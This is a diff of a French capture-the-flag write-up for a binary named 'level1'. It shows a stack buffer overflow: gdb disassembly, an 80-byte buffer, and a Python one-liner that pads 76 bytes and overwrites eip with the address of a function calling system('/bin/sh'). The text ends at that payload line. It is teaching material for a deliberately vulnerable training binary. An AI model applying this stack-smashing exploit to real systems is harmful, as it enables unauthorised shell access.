@@ -1,19 +1,14 @@
 # Level 1
 
-Quand je lance le programme `level1` je peux voir qu'il lis sur l'entrée standard, il doit donc être possible de faire un buffer overflow.
-
-Je peux tester si le programme `segfault` en écrivant une longue suite de charactère.
-
+Quand je lance le programme `level1` je peux voir qu'il lit sur l'entrée standard, il doit donc être possible de faire un [*buffer overflow*](https://en.wikipedia.org/wiki/Buffer_overflow).  
+Je peux tester si le programme `segfault` en écrivant une longue suite de caractères :
 ```sh
 ~ ./level1
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault (core dumped)
 ```
 
-Je sais donc que je peux injecter du `shellcode` au programme pour éxécuter `/bin/sh`.
-
-Pour savoir combien de charactère je vais devoir injecter, je lance `gdb`. Le buffer est de `0x50` soit `80` en décimal comme on peut le voir à l'instruction `<+6>` du main.
-
+Pour déterminer la longueur du buffer, je lance `gdb`. Le buffer est de `0x50` (soit `80` en décimal) comme on peut le voir à l'instruction `<+6>` du main :
 ```shell
 ~ gdb level1
 (gdb) disas main
@@ -30,8 +25,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-En éxécutant la commande `info function` dans `gdb`, on remarque qu'il y a un appel à `system` et qu'il existe une fonction `run` et que c'est elle qui appel la fonction `system`.
-
+En exécutant la commande `info function` dans `gdb`, on remarque qu'il y a un appel à [`system`](https://linux.die.net/man/3/system) qui se fait dans une fonction `run` :
 ```shell
 (gdb) info function
 All defined functions:
@@ -70,7 +64,11 @@ End of assembler dump.
 0x8048584:	 "/bin/sh"
 ```
 
-L'argument que prend `system` est `/bin/sh`, notre objectif est donc d'appeler `run` à la place d'un `shellcode` en utilisant son adresse `0x08048444`. On fait un padding de `76` A car lorsque nous mettons `80` nous réecrivons `EIP`.
+L'argument que prend `system` est `/bin/sh`. Notre objectif est donc d'appeler `run` à la place d'un `shellcode` en utilisant son adresse `0x08048444`. Il faut d'abord convertir cette adresse en format [*little endian*](https://en.wikipedia.org/wiki/Endianness), soit `\x44\x84\x04\x08`.  
+Notre exploit utilisera la technique du [*stack smashing*](https://insecure.org/stf/smashstack.html) (voir aussi [cet article](https://www.exploit-db.com/papers/24085)).
+    - Dans une architecture x86 32 bits, le registre `eip` contient l'[*instruction pointer*](https://en.wikipedia.org/wiki/Program_counter), càd l'adresse mémoire de la prochaine commande à exécuter.
+    - Concrétement, on va ici écrire au delà de la mémoire tampon pour écraser la valeur du registre `eip` et y placer l'adresse de la fonction `run`
+    - Pour cela, nous utiliserons un padding de 76 caractères, puisque les 4 derniers caractères de la chaîne contiendront l'adresse que nous allons écrire dans le registre `eip`.
 
 ```shell
 ~ python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/run
